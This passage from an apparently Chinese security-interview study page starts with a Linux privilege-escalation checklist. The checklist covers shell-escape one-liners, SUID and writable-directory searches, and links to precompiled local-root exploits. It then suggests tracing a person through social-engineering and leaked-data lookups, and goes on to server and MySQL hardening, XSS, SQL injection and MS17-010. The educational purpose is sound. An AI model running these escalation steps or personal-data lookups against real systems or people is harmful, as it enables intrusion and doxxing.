&#x2F;var&#x2F;log&#x2F;dpkg.logcat &#x2F;var&#x2F;log&#x2F;faillogcat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_logcat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.logcat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_logcat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error.logcat &#x2F;var&#x2F;log&#x2F;lastlogcat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;access.logcat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;error.logcat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.access.logcat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.error.logcat &#x2F;var&#x2F;log&#x2F;messagescat &#x2F;var&#x2F;log&#x2F;securecat &#x2F;var&#x2F;log&#x2F;syslogcat &#x2F;var&#x2F;log&#x2F;wtmpcat &#x2F;var&#x2F;log&#x2F;xferlogcat &#x2F;var&#x2F;log&#x2F;yum.logcat &#x2F;var&#x2F;run&#x2F;utmpcat &#x2F;var&#x2F;webmin&#x2F;miniserv.logcat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access_logcat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access.logls -alh &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;ls -alh &#x2F;var&#x2F;log&#x2F;postgresql&#x2F;ls -alh &#x2F;var&#x2F;log&#x2F;proftpd&#x2F;ls -alh &#x2F;var&#x2F;log&#x2F;samba&#x2F;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,</p><p> mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)</p><p> 如果命令限制，你可以打出哪些突破它的限制？</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&#x2F;bin&#x2F;sh -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如何安装文件系统？</p><pre class="line-numbers language-none"><code class="language-none">mountdf -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是否有挂载的文件系统？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -1000 -type d 2&gt;&#x2F;dev&#x2F;null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename herefind &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SGID (chmod 2000) - run as the  group, not the user who started it.find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SUID (chmod 4000) - run as the  owner, not the user who started it.find &#x2F; -perm -g&#x3D;s -o -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SGID or SUIDfor i in &#96;locate -r &quot;bin$&quot;&#96;; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;&#x2F;dev&#x2F;null; done    #Looks in &amp;#039;common&amp;#039; places: &#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin,&#x2F;usr&#x2F;local&#x2F;bin, &#x2F;usr&#x2F;local&#x2F;sbin and any other *bin, for SGID or SUID(Quicker search)#findstarting at root (&#x2F;), SGIDorSUID, not Symbolic links, only 3folders deep, list with more detail and hideany errors (e.g. permissiondenied)find&#x2F;-perm -g&#x3D;s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 在哪些目录可以写入和执行呢？几个“共同”的目录：&#x2F; tmp目录，&#x2F;var &#x2F; tmp目录&#x2F; dev &#x2F;shm目录</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null        # world-writeable foldersfind &#x2F; -perm -222 -type d 2&gt;&#x2F;dev&#x2F;null      # world-writeable foldersfind &#x2F; -perm -o+w -type d 2&gt;&#x2F;dev&#x2F;null    # world-writeable foldersfind &#x2F; -perm -o+x -type d 2&gt;&#x2F;dev&#x2F;null    # world-executable foldersfind &#x2F; ( -perm -o+w -perm -o+x ) -type d 2&gt;&#x2F;dev&#x2F;null   # world-writeable &amp; executable foldersAny &quot;problem&quot; files？可写的的，“没有使用&quot;的文件find &#x2F; -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print   # world-writeable filesfind &#x2F;dir -xdev ( -nouser -o -nogroup ) -print   # Noowner files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 准备和查找漏洞利用代码</p><p> 安装了什么开发工具&#x2F;语言&#x2F;支持？</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name perl*find &#x2F; -name python*find &#x2F; -name gcc*find &#x2F; -name cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如何上传文件？</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name wgetfind &#x2F; -name nc*find &#x2F; -name netcat*find &#x2F; -name tftp*find &#x2F; -name ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找exploit代码</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.exploit-db.comhttp:&#x2F;&#x2F;1337day.comhttp:&#x2F;&#x2F;www.securiteam.comhttp:&#x2F;&#x2F;www.securityfocus.comhttp:&#x2F;&#x2F;www.exploitsearch.nethttp:&#x2F;&#x2F;metasploit.com&#x2F;modules&#x2F;http:&#x2F;&#x2F;securityreason.comhttp:&#x2F;&#x2F;seclists.org&#x2F;fulldisclosure&#x2F;http:&#x2F;&#x2F;www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找更多有关漏洞的信息</p><p> <a href="http://www.cvedetails.com/">http://www.cvedetails.com</a></p><p> <a href="http://packetstormsecurity.org/files/cve/[CVE]">http://packetstormsecurity.org/files/cve/[CVE]</a></p><p> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=%5BCVE%5D%5Dhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=%5BCVE%5D">http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</a></p><p> <a href="http://www.vulnview.com/cve-details.php?cvename=%5BCVE%5D%5Dhttp://www.vulnview.com/cve-details.php?cvename=%5BCVE%5D">http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]</a></p><p> <a href="http://www.91ri.org/">http://www.91ri.org/</a></p><p> (快速）“共同的“exploit,预编译二进制代码文件</p><p> <a href="http://tarantula.by.ru/localroot/">http://tarantula.by.ru/localroot/</a></p><p> <a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p><p> 上面的信息很难吗？</p><p> 快去使用第三方脚本&#x2F;工具来试试吧！</p><p> 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？</p><pre class="line-numbers language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgradeyum update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="21-如果你查到一个qq号怎么分析攻击者"><a href="#21-如果你查到一个qq号怎么分析攻击者" class="headerlink" title="21.如果你查到一个qq号怎么分析攻击者"></a>21.如果你查到一个qq号怎么分析攻击者</h2><p>1.尝试进入其空间获取其更多信息，或者加上他的好友进行社工。 2.利用社工库查询手机号，通过手机号再反查其他平台，<br>如支付宝，阿里云等等。  </p><p>3.案例 <a href="https://mp.weixin.qq.com/s/f_TzsgM0ujWL99bEr5aRiQ">https://mp.weixin.qq.com/s/f_TzsgM0ujWL99bEr5aRiQ</a> </p><h2 id="22-分别讲述一下服务器、数据库、网站的安全加固"><a href="#22-分别讲述一下服务器、数据库、网站的安全加固" class="headerlink" title="22.分别讲述一下服务器、数据库、网站的安全加固"></a>22.分别讲述一下服务器、数据库、网站的安全加固</h2><h3 id="服务器加固"><a href="#服务器加固" class="headerlink" title="服务器加固"></a>服务器加固</h3><p>原文：<a href="https://www.jianshu.com/p/97a2ee6aa9d1?from=timeline">https://www.jianshu.com/p/97a2ee6aa9d1?from=timeline</a></p><ol><li>禁止root用户直接登陆</li></ol><pre class="line-numbers language-none"><code class="language-none">1) 编辑配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改PermitRootLogin 后面的yes 为 no ,并且去掉前面的注释符2)编辑 &#x2F;etc&#x2F;pam.d&#x2F;login文件，配置auth required pam_securetty.so3)编辑&#x2F;etc&#x2F;passwd,账户信息的shell为&#x2F;sbin&#x2F;nologin的为禁止远程登陆，如要允许，则改成可以登陆的shell即可，如&#x2F;sbin&#x2F;bash。4)然后重启sshd服务 service sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2.设置用户密码复杂度和过期时间</p><pre class="line-numbers language-none"><code class="language-none">是在&#x2F;etc&#x2F;login.defs文件，里面几个选项PASS_MAX_DAYS   90  #密码最长过期天数PASS_MIN_DAYS   80  #密码最小过期天数PASS_MIN_LEN    10  #密码最小长度PASS_WARN_AGE   7   #密码过期警告天数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.登陆超时设置</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;profile最后一行加入TMOUT&#x3D;300<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.系统关键文件权限设置</p><pre class="line-numbers language-none"><code class="language-none">通过chmod命令对目录的权限进行实际设置&#x2F;etc&#x2F;passwd 必须所有用户都可读，root用户可写 –rw-r—r— &#x2F;etc&#x2F;shadow 只有root可读 –r-------- &#x2F;etc&#x2F;group  须所有用户都可读，root用户可写 –rw-r—r—使用如下命令设置：chmod 644 &#x2F;etc&#x2F;passwdchmod 600 &#x2F;etc&#x2F;shadowchmod 644 &#x2F;etc&#x2F;group<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.设置文件与目录缺省权限</p><pre class="line-numbers language-none"><code class="language-none">在文件&#x2F;etc&#x2F;profile中设置umask 027或UMASK 027设置默认权限： vi &#x2F;etc&#x2F;login.defs， 在末尾增加umask 027或UMASK 027，将缺省访问权限设置为750<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6.设置ssh登录前警告Banner</p><pre class="line-numbers language-none"><code class="language-none">1.  执行如下命令创建ssh banner信息文件： #touch &#x2F;etc&#x2F;ssh_banner #chown bin:bin &#x2F;etc&#x2F;ssh_banner #chmod 644 &#x2F;etc&#x2F;ssh_banner #echo &quot; Authorized only. All activity will be monitored and reported &quot;&gt; &#x2F;etc&#x2F;ssh_banner 可根据实际需要修改该文件的内容。 2.  修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件，添加如下行： Banner &#x2F;etc&#x2F;ssh_banner 3.  重启sshd服务： #&#x2F;etc&#x2F;init.d&#x2F;sshd restart <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7.设置文件与目录缺省权限</p><pre class="line-numbers language-none"><code class="language-none">在文件&#x2F;etc&#x2F;profile中设置umask 027或UMASK 027设置默认权限： vi &#x2F;etc&#x2F;login.defs， 在末尾增加umask 027或UMASK 027，将缺省访问权限设置为750如果服务器类型为采集服务器或应用中需要使用ftp的，需要设置umask为007，并把ftp用户组和启动应用的用户设置为同一用户组下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>8.修改ssh默认端口</p><pre class="line-numbers language-none"><code class="language-none"># vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改Port 17382#service sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>9.限制用户su到root</p><pre class="line-numbers language-none"><code class="language-none">编辑su文件(vi &#x2F;etc&#x2F;pam.d&#x2F;su)，在开头添加下面两行： auth sufficient pam_rootok.so 和 auth required pam_wheel.so group&#x3D;wheel 这表明只有wheel组的成员可以使用su命令成为root用户。 你可以把用户添加到wheel组，以使它可以使用su命令成为root用户。 添加方法为：usermod –G wheel username备注：双方共同运维服务器，且root密码为我方知晓时设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>10.检查拥有suid和sgid权限的文件</p><pre class="line-numbers language-none"><code class="language-none">执行命令: find &#x2F;usr&#x2F;bin&#x2F;chage &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;wall &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;write &#x2F;usr&#x2F;sbin&#x2F;usernetctl &#x2F;usr&#x2F;sbin&#x2F;traceroute &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ping &#x2F;sbin&#x2F;netreport -type f -perm -04000 -o -perm -02000 -type f -xdev 2&gt;&#x2F;dev&#x2F;null 如果存在输出结果，则使用chmod 755 文件名 命令修改文件的权限。 例如：chmod a-s &#x2F;usr&#x2F;bin&#x2F;chage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><p>[原文](<a href="https://www.hackbase.net/article-260336-1.html">干货！数据库安全之Mysql数据库安全加固-【黑基网】 (hackbase.net)</a>)</p><h4 id="账号加固"><a href="#账号加固" class="headerlink" title="账号加固"></a>账号加固</h4><p>以普通帐户安全运行mysqld，禁止mysql以<strong>root</strong>帐号权限运行。防止攻击者可能通过mysql进行提权。</p><p><strong>配置&#x2F;etc&#x2F;my.cnf</strong></p><pre class="line-numbers language-none"><code class="language-none">[mysql.server]user&#x3D;mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402223821659.png"></p><p><strong>减少管理员账户</strong></p><p>管理员账户越多，风险越大，所以你应该保持尽可能最少的帐户数量，只有为那些真正需要它的人创建账户。如果你有很多管理员账户，那你需要定期检查并清理那些不必要的账户。</p><p><strong>普通用户启动</strong></p><p>禁止以root账号运行mysqld;</p><p>检测操作</p><p>检查进程属主和运行参数是否包含–user&#x3D;mysql类似语句：</p><pre class="line-numbers language-none"><code class="language-none">&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39;;如上这种这其实是完全放开了所以ip对root的访问。所以应该把重要的操作限制给特定主机：&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;localhost&#39;;&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;指定ip&#39; ;&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402223954051.png"></p><p><strong>新增用户</strong></p><p>应按照应用分配不同账号，避免不同用户间共享账号</p><p>创建用户 设定指定ip地址登陆数据库</p><pre class="line-numbers language-none"><code class="language-none">create user vvera@&#39;指定ip地址&#39;   identified by &#39;vv@122&#39;；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就创建了一个名为：vvera 密码为：vv@122 的用户。然后登录一下</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224031267.png"></p><p><strong>删除不用的用户</strong></p><p>应删除或锁定与数据库运行、维护等工作无关的账号</p><p><strong>移除匿名账户和废弃的账户</strong></p><p>DROP USER语句用于删除一个或多个MySQL账户。要使用DROP USER，必须拥有mysql数据库的全局CREATE USER权限或DELETE权限。账户名称的用户和主机部分与用户表记录的User和Host列值相对应。使用DROP USER，您可以取消一个账户和其权限，操作如下：</p><pre class="line-numbers language-none"><code class="language-none"># ps –ef | grep mysqld#grep -i user &#x2F;etc&#x2F;my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该语句可以删除来自所有授权表的帐户权限记录。红色标识的无用账户都可以删除。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224111829.png"></p><p>使用操作命令之后的结果</p><pre class="line-numbers language-none"><code class="language-none">drop user &#39;&#39;@&#39;mysql&#39;,&#39;&#39;@&#39;localhost&#39;,&#39;root&#39;@&#39;::1&#39;,&#39;root&#39;@&#39;mysql&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224142129.png"></p><p><strong>说明</strong></p><p>DROP USER不能自动关闭任何打开的用户对话。而且，如果用户有打开的对话，此时取消用户，则命令不会生效，直到用户对话被关闭后才生效。一旦对话被关闭，用户也被取消，此用户再次试图登录时将会失败。</p><p>检测操作：mysql 查看所有用户</p><pre class="line-numbers language-none"><code class="language-none">create user vvera@&#39;指定ip地址&#39;   identified by &#39;safe6@2020!&#39;；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224251586.png"></p><p>依次检查所列出的账户是否为必要账户，删除无用户或过期账户。</p><p><strong>注意：仔细核对，防止误删</strong></p><h4 id="口令策略加固"><a href="#口令策略加固" class="headerlink" title="口令策略加固"></a>口令策略加固</h4><p><strong>检查帐户默认密码和弱密码，建议使用5.7之后版本提高安全性</strong></p><p>修改帐户<strong>弱密码</strong>如要修改密码，执行如下命令：检查本地密码：(注意，5.7之前管理帐号root默认是空密码)</p><pre class="line-numbers language-none"><code class="language-none">mysql&gt; update user set password&#x3D;password(&#39;vv@122&#39;) where user&#x3D;&#39;root&#39;;mysql&gt; flush privileges;检测方法mysql&gt; use mysql;mysql&gt; select Host,User,Password,Select_priv,Grant_priv from user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224413591.png"></p><h4 id="用户权限加固"><a href="#用户权限加固" class="headerlink" title="用户权限加固"></a>用户权限加固</h4><p>在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限。</p><h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><p>有些应用程序是通过一个特定数据库表的用户名和口令连接到MySQL的，安全人员不应当给予这个用户完全的访问权。如果攻击者获得了这个拥有完全访问权的用户，他也就拥有了所有的数据库。查看一个用户许可的方法是在MySQL控制台中使用命令<strong>SHOW GRANT</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt;SHOW GRANTS FOR ; &#39;vvera&#39;@&#39;localhost&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">为定义用户的访问权，使用GRANT命令。在下面的例子中，vvera仅能从tanggula数据库的mserver表中选择：&gt; GRANT SELECT ON tanggula. mserver TO &#39;vvera&#39;@&#39;localhost&#39;;&gt; FLUSH PRIVILEGES;vvera用户就无法改变数据库中这个表和其它表的任何数据。如果你要从一个用户移除访问权，就应使用一个与GRANT命令类似的REVOKE命令：&gt; REVOKE SELECT ON tanggula. mserver FROM &#39;vvera&#39;@&#39;localhost&#39;;&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>权限权限范围给谁授权权限范围grant allON .to vvera授权vvera全库权限grant selectON tanggula.*to vvera授权vvera唐古拉数据库查看权限grant createON tanggula.*to vvera授权vvera数据库添加权限</p><p>授权并创建用户，并指定密码</p><pre class="line-numbers language-none"><code class="language-none">grant 权限 on 权限范围  to 用户 identified by &#39;密码&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>回收权限revoke 权限 on 范围 from 用户</p><h4 id="日志审计加固"><a href="#日志审计加固" class="headerlink" title="日志审计加固"></a>日志审计加固</h4><p>数据库配置日志功能(切记不要用root用户，防止日志写shell)</p><pre class="line-numbers language-none"><code class="language-none">show variables like &#39;log_%&#39;;查看所有的log命令 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224519449.png"></p><pre class="line-numbers language-none"><code class="language-none">show variables like &#39;log_bin&#39;;查看具体的log命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224544048.png"></p><p>启用日志记录让你可以检测服务器上的活动，这样你就可以分析失败的登录尝试和敏感文件的访问记录，以便了解是否存在向你的服务器和数据库发起的恶意活动。<br>你只需要把log &#x3D;&#x2F;var&#x2F;log&#x2F;mylogfile指令添加到MySQL配置文件中，就可以手动启用日志记录功能。<br>日志记录仅适用于查询数量有限的数据库服务器。对于信息量大的服务器，这可能会导致高过载。</p><h4 id="禁用或限制远程访问"><a href="#禁用或限制远程访问" class="headerlink" title="禁用或限制远程访问"></a>禁用或限制远程访问</h4><p>尽可能的禁止远程网络连接，防止猜解密码攻击，溢出攻击和嗅探攻击。</p><p><strong>远程访问</strong></p><p>直接通过<strong>本机</strong>之外的计算机改变生产环境中的数据库是异常危险的。</p><p>有时，管理员会打开远程主机对数据库的访问(<strong>应当设置为指定ip</strong>)：</p><pre class="line-numbers language-none"><code class="language-none">&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39;;如上这种这其实是完全放开了所以ip对root的访问。所以应该把重要的操作限制给特定主机：&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;localhost&#39;;&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;指定ip&#39; ;&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224622293.png"></p><p>如果数据库不需远程访问，可以禁止远程tcp&#x2F;ip连接, 通过在mysqld服务器中参数中添加 –skip-networking 启动参数来使mysql不监听任何TCP&#x2F;IP连接，增加安全性。强迫MySQL仅监听本机，方法是在my.cnf的[mysqld]部分增加下面一行：bind-address&#x3D;127.0.0.1</p><p>如果非要开启远程访问，建议设置指定ip连接。</p><h4 id="移除测试自带的test数据库和禁用LOCAL-INFILE-OUTFILE"><a href="#移除测试自带的test数据库和禁用LOCAL-INFILE-OUTFILE" class="headerlink" title="移除测试自带的test数据库和禁用LOCAL INFILE OUTFILE"></a>移除测试自带的test数据库和禁用LOCAL INFILE OUTFILE</h4><p>删除可以匿名访问的test数据库和防止非授权用户访问本地文件</p><p><strong>移除自带的测试（test）数据库</strong></p><p>在默认安装的MySQL中，匿名用户可以访问test数据库。我们可以移除任何无用的数据库，以避免在不可预料的情况下访问了数据库。因而，在MySQL控制台中，执行：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224652237.png"></p><pre class="line-numbers language-none"><code class="language-none">&gt; DROP DATABASE test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224712288.png"></p><p><strong>禁用LOCAL INFILE，防止造成任意文件读取</strong></p><p>另一项改变是禁用”LOAD DATA LOCAL INFILE”命令，这有助于防止非授权用户访问本地文件。在PHP应用程序中发现有新的SQL注入漏洞时，这样做尤其重要。此外，在某些情况下，LOCAL INFILE命令可被用于访问操作系统上的其它文件(如&#x2F;etc&#x2F;passwd)，应使用下现的命令：</p><pre class="line-numbers language-none"><code class="language-none">mysql&gt; SELECT load_file(&quot;&#x2F;etc&#x2F;passwd&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224734879.png"></p><p>禁用LOCAL INFILE命令，应当在MySQL配置文件的[mysqld]部分增加下面的参数：</p><pre class="line-numbers language-none"><code class="language-none">set-variable&#x3D;local-infile&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224755283.png"></p><p><strong>禁用LOCAL OUTFILE，防止webshell写出</strong></p><p>查看是否可以导入导出</p><pre class="line-numbers language-none"><code class="language-none">show variables like &#39;%secure%&#39;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p><p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</p><p>禁用LOCAL OUTFILE命令(对导入同样生效)，应当在MySQL配置文件的[mysqld]部分增加下面的参数：</p><pre class="line-numbers language-none"><code class="language-none">secure_file_priv&#x3D; null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>删除历史文件</strong><br>MySQL服务器有一个历史文件，它可以帮助你在安装出错的时候找到问题所在。历史文件包含敏感信息，比如说密码，如果这些信息被攻击者获得，那么将会给<br>你的数据库带来巨大的安全隐患。在安装成功后，历史文件并没有什么用，因此你可以使用cat &#x2F;dev&#x2F;null &gt;<br>~&#x2F;.mysql_history指令来删除文件当中的内容</p><h3 id="网站加固"><a href="#网站加固" class="headerlink" title="网站加固"></a>网站加固</h3><p>部署CDN，定期扫描漏洞，上waf，隐藏后台登陆口，关闭不变要的端口。</p><h2 id="23-XSS类型都有哪些，什么是dom型xss，如何防御"><a href="#23-XSS类型都有哪些，什么是dom型xss，如何防御" class="headerlink" title="23.XSS类型都有哪些，什么是dom型xss，如何防御"></a>23.XSS类型都有哪些，什么是dom型xss，如何防御</h2><p><strong>XSS（Cross-Site Scripting）又称跨站脚本</strong>，XSS的重点不在于跨站点，而是在于脚本的执行。XSS是一种经常出现在 Web 应用程序中的计算机安全漏洞，是由于 Web 应用程序对用户的输入过滤不足而产生的<br>常见的有三种：<strong>反射型</strong>、<strong>DOM-based 型</strong>、存储型。<br>其中存储型归类为持久型 XSS 攻击，反射型、DOM-based 型可以归类为非持久型 XSS 攻击。<br>反射型：经过后端，不经过数据库<br>存储型：经过后端，经过数据库<br>DOM：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的</p><p>DOM:客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等</p><h2 id="24-sql注入你都了解什么类型，如何防御"><a href="#24-sql注入你都了解什么类型，如何防御" class="headerlink" title="24.sql注入你都了解什么类型，如何防御"></a>24.sql注入你都了解什么类型，如何防御</h2><p>最基础的注入-union注入攻击<br>Boolean注入攻击-布尔盲注<br>报错注入攻击<br>时间注入攻击-时间盲注<br>堆叠查询注入攻击<br>二次注入攻击<br>宽字节注入攻击<br>base64注入攻击<br>cookie注入攻击-http请求头参数注入<br>XFF注入攻击-http请求头参数注入<br>知道绝对路径的注入<br><a href="https://www.cnblogs.com/-chenxs/p/11614129.html">https://www.cnblogs.com/-chenxs/p/11614129.html</a><br>sql语句预编译和绑定变量，但是不是所有场景都能够采用 sql语句预编译，有一些场景必须的采用 字符串拼接的方式，此时，我们严格检查参数的数据类型，还有可以使用一些安全函数，来方式sql注入<br><a href="https://blog.csdn.net/qq_35114086/article/details/92830127">https://blog.csdn.net/qq_35114086/article/details/92830127</a></p><h2 id="25-MS17-010使用的是什么端口"><a href="#25-MS17-010使用的是什么端口" class="headerlink" title="25.MS17-010使用的是什么端口"></a>25.MS17-010使用的是什么端口</h2><p>永恒之蓝漏洞，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器<br>，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。<br>更多：<a href="https://www.freebuf.com/column/193681.html">https://www.freebuf.com/column/193681.html</a></p><h2 id="26-冰蝎连接的特征和原理"><a href="#26-冰蝎连接的特征和原理" class="headerlink" 